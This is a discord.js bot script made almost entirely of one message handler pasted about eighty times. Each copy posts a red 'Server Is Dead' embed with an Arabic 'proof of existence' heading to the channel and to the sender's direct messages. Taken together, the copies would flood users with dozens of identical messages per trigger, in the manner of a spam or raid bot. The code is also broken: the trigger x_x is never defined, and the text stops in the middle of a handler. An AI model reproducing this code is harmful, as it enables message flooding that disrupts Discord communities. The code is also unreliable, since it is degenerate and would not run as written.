client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
